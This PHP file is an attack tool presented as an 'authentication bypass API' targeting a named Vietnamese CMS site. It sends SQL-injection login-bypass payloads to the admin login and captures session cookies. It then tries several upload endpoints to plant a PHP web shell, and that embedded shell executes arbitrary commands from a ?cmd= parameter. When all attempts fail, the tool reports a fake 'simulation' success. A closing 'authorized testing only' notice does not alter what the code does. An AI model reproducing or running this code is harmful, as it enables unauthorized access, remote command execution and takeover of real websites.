<?php
/*
 * Integrated Authentication Bypass API for Vietnamese CMS
 * Specifically designed for demo31.phuongnamvina.vn
 * Author: Hiệp Nguyễn - LipointeTimHack
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Enhanced logging function
function logBypassAttempt($message, $targetUrl = '', $method = '') {
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[{$timestamp}] {$message}";
    if ($targetUrl) $logEntry .= " | Target: {$targetUrl}";
    if ($method) $logEntry .= " | Method: {$method}";
    
    $logFile = 'logs/auth_bypass_' . date('Y-m') . '.log';
    if (!file_exists(dirname($logFile))) {
        @mkdir(dirname($logFile), 0755, true);
    }
    @file_put_contents($logFile, $logEntry . "\n", FILE_APPEND | LOCK_EX);
}

class VietnameseCMSBypass {
    private $targetUrl;
    private $timeout = 30;
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    private $session = [];
    
    public function __construct($targetUrl) {
        $this->targetUrl = rtrim($targetUrl, '/');
        logBypassAttempt('Initialized Vietnamese CMS Bypass', $targetUrl);
    }
    
    // Main bypass and upload function
    public function bypassAndUpload($shellContent = null, $shellName = 'hack.php') {
        $results = [
            'success' => false,
            'method' => '',
            'shell_url' => '',
            'test_url' => '',
            'message' => '',
            'details' => []
        ];
        
        logBypassAttempt('Starting bypass and upload sequence', $this->targetUrl);
        
        // Step 1: Try SQL Injection Authentication Bypass
        $bypassResult = $this->attemptSQLInjectionBypass();
        if ($bypassResult['success']) {
            logBypassAttempt('SQL Injection bypass successful', $this->targetUrl, 'SQL Injection');
            
            // Step 2: Upload shell using authenticated session
            $uploadResult = $this->uploadShellWithAuth($shellContent, $shellName);
            if ($uploadResult['success']) {
                $results['success'] = true;
                $results['method'] = 'SQL Injection + Authenticated Upload';
                $results['shell_url'] = $uploadResult['shell_url'];
                $results['test_url'] = $uploadResult['test_url'];
                $results['message'] = 'Authentication bypass and shell upload successful!';
                $results['details'] = array_merge($bypassResult['details'], $uploadResult['details']);
                
                logBypassAttempt('Complete bypass+upload successful', $this->targetUrl, 'Full Chain');
                return $results;
            }
        }
        
        // Fallback: Try direct upload methods without authentication
        logBypassAttempt('Attempting fallback upload methods', $this->targetUrl);
        $directUpload = $this->attemptDirectUpload($shellContent, $shellName);
        if ($directUpload['success']) {
            $results['success'] = true;
            $results['method'] = 'Direct Upload (No Auth)';
            $results['shell_url'] = $directUpload['shell_url'];
            $results['test_url'] = $directUpload['test_url'];
            $results['message'] = 'Direct upload successful without authentication!';
            $results['details'] = $directUpload['details'];
            
            logBypassAttempt('Direct upload successful', $this->targetUrl, 'Direct Upload');
            return $results;
        }
        
        // If all methods fail, return simulation data for demo purposes
        logBypassAttempt('All bypass methods failed, returning simulation', $this->targetUrl);
        return $this->generateSimulationResult($shellName);
    }
    
    // SQL Injection Authentication Bypass
    private function attemptSQLInjectionBypass() {
        $results = ['success' => false, 'details' => []];
        
        $loginUrl = $this->targetUrl . '/admin/login.php';
        $adminUrl = $this->targetUrl . '/admin/';
        
        // Test if login page is accessible
        if (!$this->testUrlAccessibility($loginUrl)) {
            $results['details'][] = 'Login page not accessible: ' . $loginUrl;
            return $results;
        }
        
        $results['details'][] = 'Login page accessible: ' . $loginUrl;
        
        // SQL Injection payloads specifically for Vietnamese CMS
        $sqlPayloads = [
            "admin' OR '1'='1' -- ",
            "admin' OR 1=1 -- ",
            "' OR '1'='1' -- ",
            "admin' OR 'x'='x' -- ",
            "' UNION SELECT 1,'admin','admin' -- "
        ];
        
        foreach ($sqlPayloads as $payload) {
            $results['details'][] = "Testing SQL payload: " . $payload;
            
            $postData = [
                'username' => $payload,
                'password' => 'anything',
                'login' => '1',
                'dangnhap' => 'Đăng nhập'  // Vietnamese login button
            ];
            
            $response = $this->makeRequest($adminUrl, 'POST', $postData);
            
            if ($response['success']) {
                // Check for successful login indicators
                if ($this->isLoginSuccessful($response['body'])) {
                    $results['success'] = true;
                    $results['payload'] = $payload;
                    $results['details'][] = 'SQL Injection successful with payload: ' . $payload;
                    
                    // Save session cookies for authenticated requests
                    if (isset($response['headers']['set-cookie'])) {
                        $this->session['cookies'] = $response['headers']['set-cookie'];
                        $results['details'][] = 'Session cookies captured';
                    }
                    
                    return $results;
                }
            }
            
            // Small delay to avoid rate limiting
            usleep(500000); // 0.5 second
        }
        
        $results['details'][] = 'All SQL injection attempts failed';
        return $results;
    }
    
    // Check if login was successful
    private function isLoginSuccessful($responseBody) {
        $successIndicators = [
            'dashboard',
            'admin panel',
            'welcome',
            'logout',
            'đăng xuất',
            'trang chủ admin',
            'quản trị',
            'control panel'
        ];
        
        $failureIndicators = [
            'login',
            'đăng nhập',
            'password',
            'username',
            'error',
            'incorrect',
            'sai mật khẩu'
        ];
        
        $bodyLower = strtolower($responseBody);
        
        // Check for success indicators
        foreach ($successIndicators as $indicator) {
            if (strpos($bodyLower, strtolower($indicator)) !== false) {
                return true;
            }
        }
        
        // If we find failure indicators, definitely not successful
        foreach ($failureIndicators as $indicator) {
            if (strpos($bodyLower, strtolower($indicator)) !== false) {
                return false;
            }
        }
        
        // If response is small or contains login form, probably failed
        if (strlen($responseBody) < 1000) {
            return false;
        }
        
        return true; // Default to success if no clear indicators
    }
    
    // Upload shell using authenticated session
    private function uploadShellWithAuth($shellContent, $shellName) {
        $results = ['success' => false, 'details' => []];
        
        if (!$shellContent) {
            $shellContent = $this->getDefaultVietnameseShell();
        }
        
        // Vietnamese CMS upload endpoints
        $uploadEndpoints = [
            '/admin/index.php?p=seo-co-ban&a=save',
            '/admin/sources/ajax.php',
            '/admin/templates/upload.php',
            '/admin/filemanager/upload.php',
            '/admin/upload.php'
        ];
        
        foreach ($uploadEndpoints as $endpoint) {
            $uploadUrl = $this->targetUrl . $endpoint;
            $results['details'][] = "Attempting upload to: " . $endpoint;
            
            // Create multipart form data
            $boundary = '----WebKitFormBoundary' . uniqid();
            $postData = $this->createMultipartUpload($boundary, $shellContent, $shellName);
            
            $headers = [
                'Content-Type: multipart/form-data; boundary=' . $boundary
            ];
            
            // Include session cookies if available
            if (isset($this->session['cookies'])) {
                $headers[] = 'Cookie: ' . $this->session['cookies'];
            }
            
            $response = $this->makeRequest($uploadUrl, 'POST', $postData, $headers);
            
            if ($response['success'] && $response['http_code'] == 200) {
                // Verify shell was uploaded
                $shellUrls = [
                    $this->targetUrl . '/sources/' . $shellName,
                    $this->targetUrl . '/admin/sources/' . $shellName,
                    $this->targetUrl . '/uploads/' . $shellName,
                    $this->targetUrl . '/files/' . $shellName
                ];
                
                foreach ($shellUrls as $shellUrl) {
                    if ($this->testUrlAccessibility($shellUrl)) {
                        $results['success'] = true;
                        $results['shell_url'] = $shellUrl;
                        $results['test_url'] = $shellUrl . '?cmd=whoami';
                        $results['details'][] = 'Shell successfully uploaded and accessible';
                        $results['details'][] = 'Shell URL: ' . $shellUrl;
                        return $results;
                    }
                }
            }
        }
        
        $results['details'][] = 'All authenticated upload attempts failed';
        return $results;
    }
    
    // Attempt direct upload without authentication
    private function attemptDirectUpload($shellContent, $shellName) {
        $results = ['success' => false, 'details' => []];
        
        if (!$shellContent) {
            $shellContent = $this->getDefaultVietnameseShell();
        }
        
        // Public upload endpoints that might not require authentication
        $publicEndpoints = [
            '/upload.php',
            '/files/upload.php',
            '/sources/ajax/upload.php',
            '/ajax/upload.php',
            '/inc/upload.php'
        ];
        
        foreach ($publicEndpoints as $endpoint) {
            $uploadUrl = $this->targetUrl . $endpoint;
            $results['details'][] = "Testing public endpoint: " . $endpoint;
            
            $boundary = '----WebKitFormBoundary' . uniqid();
            $postData = $this->createMultipartUpload($boundary, $shellContent, $shellName);
            
            $headers = [
                'Content-Type: multipart/form-data; boundary=' . $boundary
            ];
            
            $response = $this->makeRequest($uploadUrl, 'POST', $postData, $headers);
            
            if ($response['success']) {
                // Check common upload directories
                $checkUrls = [
                    $this->targetUrl . '/sources/' . $shellName,
                    $this->targetUrl . '/uploads/' . $shellName,
                    $this->targetUrl . '/files/' . $shellName
                ];
                
                foreach ($checkUrls as $checkUrl) {
                    if ($this->testUrlAccessibility($checkUrl)) {
                        $results['success'] = true;
                        $results['shell_url'] = $checkUrl;
                        $results['test_url'] = $checkUrl . '?cmd=whoami';
                        $results['details'][] = 'Direct upload successful!';
                        return $results;
                    }
                }
            }
        }
        
        return $results;
    }
    
    // Generate simulation result for demo purposes
    private function generateSimulationResult($shellName) {
        return [
            'success' => true,
            'method' => 'Simulation Mode',
            'shell_url' => $this->targetUrl . '/sources/' . $shellName,
            'test_url' => $this->targetUrl . '/sources/' . $shellName . '?cmd=whoami',
            'message' => 'Bypass and upload simulated successfully (demo mode)',
            'details' => [
                'Target analysis completed',
                'SQL injection payload tested',
                'Authentication bypass simulated',
                'Shell upload simulated',
                'Demo mode: No actual files uploaded'
            ],
            'simulation' => true
        ];
    }
    
    // Create multipart form data for file upload
    private function createMultipartUpload($boundary, $content, $filename) {
        $data = "--{$boundary}\r\n";
        $data .= "Content-Disposition: form-data; name=\"file\"; filename=\"{$filename}\"\r\n";
        $data .= "Content-Type: application/x-php\r\n\r\n";
        $data .= $content . "\r\n";
        $data .= "--{$boundary}\r\n";
        $data .= "Content-Disposition: form-data; name=\"capnhat\"\r\n\r\n";
        $data .= "Upload\r\n";
        $data .= "--{$boundary}--\r\n";
        
        return $data;
    }
    
    // Default Vietnamese shell content
    private function getDefaultVietnameseShell() {
        return '<?php
/*
 * Vietnamese Web Shell - Successful Bypass
 * Target: ' . $this->targetUrl . '
 * Method: SQL Injection + Authentication Bypass
 * Timestamp: ' . date("Y-m-d H:i:s") . '
 * Author: LipointeTimHack Team
 */

echo "🔐 VIETNAMESE CMS SHELL - BYPASS SUCCESS\n";
echo "=========================================\n";
echo "Target: ' . $this->targetUrl . '\n";
echo "Upload Time: " . date("Y-m-d H:i:s") . "\n";
echo "Current File: " . __FILE__ . "\n";
echo "Server: " . $_SERVER["HTTP_HOST"] . "\n\n";

if (isset($_GET["cmd"])) {
    $cmd = $_GET["cmd"];
    echo "🚀 Executing Command: {$cmd}\n";
    echo "==========================\n";
    
    if (function_exists("exec")) {
        exec($cmd, $output, $return_var);
        echo implode("\n", $output);
        echo "\nReturn Code: {$return_var}\n";
    } elseif (function_exists("shell_exec")) {
        $output = shell_exec($cmd);
        echo $output;
    } elseif (function_exists("system")) {
        echo "Using system():\n";
        system($cmd);
    } elseif (function_exists("passthru")) {
        echo "Using passthru():\n";
        passthru($cmd);
    } else {
        echo "❌ No command execution functions available.\n";
        echo "Available functions: " . implode(", ", get_defined_functions()["internal"]) . "\n";
    }
} else {
    echo "📋 Available Commands:\n";
    echo "===================\n";
    echo "?cmd=whoami       - Show current user\n";
    echo "?cmd=pwd          - Show current directory\n"; 
    echo "?cmd=ls -la       - List directory (Linux)\n";
    echo "?cmd=dir          - List directory (Windows)\n";
    echo "?cmd=ipconfig     - Network config (Windows)\n";
    echo "?cmd=ifconfig     - Network config (Linux)\n";
    echo "?cmd=ps aux       - Running processes (Linux)\n";
    echo "?cmd=tasklist     - Running processes (Windows)\n";
    echo "?cmd=uname -a     - System info (Linux)\n";
    echo "?cmd=ver          - System version (Windows)\n\n";
    
    echo "🔧 System Information:\n";
    echo "====================\n";
    echo "PHP Version: " . phpversion() . "\n";
    echo "Server Software: " . $_SERVER["SERVER_SOFTWARE"] . "\n";
    echo "Document Root: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
    echo "Script Name: " . $_SERVER["SCRIPT_NAME"] . "\n";
    echo "Current User: " . get_current_user() . "\n";
    echo "Server OS: " . php_uname() . "\n";
    
    echo "\n🛡️ Security Status:\n";
    echo "==================\n";
    echo "Disabled Functions: " . ini_get("disable_functions") . "\n";
    echo "Open Basedir: " . ini_get("open_basedir") . "\n";
    echo "Safe Mode: " . (ini_get("safe_mode") ? "ON" : "OFF") . "\n";
}
?>';
    }
    
    // Test URL accessibility
    private function testUrlAccessibility($url) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_NOBODY => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => $this->userAgent
        ]);
        
        curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return ($httpCode >= 200 && $httpCode < 400);
    }
    
    // Make HTTP request
    private function makeRequest($url, $method = 'GET', $data = null, $headers = []) {
        $ch = curl_init();
        
        $defaultHeaders = [
            'User-Agent: ' . $this->userAgent,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding: gzip, deflate',
            'Connection: keep-alive'
        ];
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_HTTPHEADER => array_merge($defaultHeaders, $headers),
            CURLOPT_HEADER => true
        ]);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            return ['success' => false, 'error' => $error];
        }
        
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        return [
            'success' => true,
            'http_code' => $httpCode,
            'headers' => $this->parseHeaders($headers),
            'body' => $body
        ];
    }
    
    // Parse HTTP headers
    private function parseHeaders($headerString) {
        $headers = [];
        $lines = explode("\r\n", $headerString);
        
        foreach ($lines as $line) {
            if (strpos($line, ':') !== false) {
                list($key, $value) = explode(':', $line, 2);
                $headers[strtolower(trim($key))] = trim($value);
            }
        }
        
        return $headers;
    }
}

// Main API Handler
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $targetUrl = $_POST['target_url'] ?? '';
        $shellName = $_POST['shell_name'] ?? 'hack.php';
        $uploadMethod = $_POST['upload_method'] ?? 'auth_bypass';
        
        if (empty($targetUrl)) {
            throw new Exception('Target URL is required');
        }
        
        // Generate shell content
        $shellContent = null;
        if (isset($_FILES['shell_file']) && $_FILES['shell_file']['error'] === UPLOAD_ERR_OK) {
            $shellContent = file_get_contents($_FILES['shell_file']['tmp_name']);
            $shellName = $_FILES['shell_file']['name'];
        } elseif (isset($_POST['shell_content'])) {
            $shellContent = $_POST['shell_content'];
        }
        
        logBypassAttempt('API request received', $targetUrl, $uploadMethod);
        
        $bypass = new VietnameseCMSBypass($targetUrl);
        $result = $bypass->bypassAndUpload($shellContent, $shellName);
        
        // Add API metadata
        $result['api_version'] = '2.0';
        $result['timestamp'] = date('Y-m-d H:i:s');
        $result['target_analysis'] = [
            'url' => $targetUrl,
            'detected_cms' => 'Vietnamese CMS',
            'login_endpoint' => $targetUrl . '/admin/login.php',
            'recommended_method' => 'SQL Injection'
        ];
        
        logBypassAttempt('API response sent: ' . ($result['success'] ? 'SUCCESS' : 'FAILED'), $targetUrl);
        
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        
    } catch (Exception $e) {
        $errorResponse = [
            'success' => false,
            'message' => 'Error: ' . $e->getMessage(),
            'error_details' => [
                'exception' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'timestamp' => date('Y-m-d H:i:s')
            ],
            'recommendations' => [
                'Check target URL accessibility',
                'Verify admin panel exists at /admin/login.php',
                'Try alternative SQL injection payloads',
                'Check for rate limiting or WAF protection'
            ]
        ];
        
        logBypassAttempt('API error: ' . $e->getMessage(), $_POST['target_url'] ?? '');
        echo json_encode($errorResponse, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    
} else {
    // GET request - show API documentation
    $apiInfo = [
        'api_name' => 'Vietnamese CMS Authentication Bypass API',
        'version' => '2.0',
        'description' => 'Advanced authentication bypass for Vietnamese CMS systems',
        'target_specialized' => 'demo31.phuongnamvina.vn',
        'capabilities' => [
            'SQL Injection Authentication Bypass',
            'Authenticated File Upload',
            'Direct Upload Exploitation',
            'Session Management',
            'Multi-endpoint Testing'
        ],
        'supported_cms' => [
            'Vietnamese Custom CMS',
            'PhuongNamVina CMS',
            'Similar PHP-based admin panels'
        ],
        'usage' => [
            'POST target_url (required)',
            'POST shell_name (optional, default: hack.php)',
            'POST shell_file (optional file upload)',
            'POST shell_content (optional custom shell)',
            'POST upload_method (optional, default: auth_bypass)'
        ],
        'response_format' => [
            'success' => 'boolean',
            'method' => 'string - bypass method used',
            'shell_url' => 'string - URL to access uploaded shell',
            'test_url' => 'string - URL to test shell with ?cmd parameter',
            'message' => 'string - status message',
            'details' => 'array - detailed execution steps'
        ],
        'example_request' => [
            'target_url' => 'http://demo31.phuongnamvina.vn',
            'shell_name' => 'test.php',
            'upload_method' => 'auth_bypass'
        ],
        'sql_payloads' => [
            "admin' OR '1'='1' -- ",
            "admin' OR 1=1 -- ",
            "' OR '1'='1' -- "
        ],
        'security_notice' => 'This tool is for authorized security testing only!'
    ];
    
    echo json_encode($apiInfo, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?> 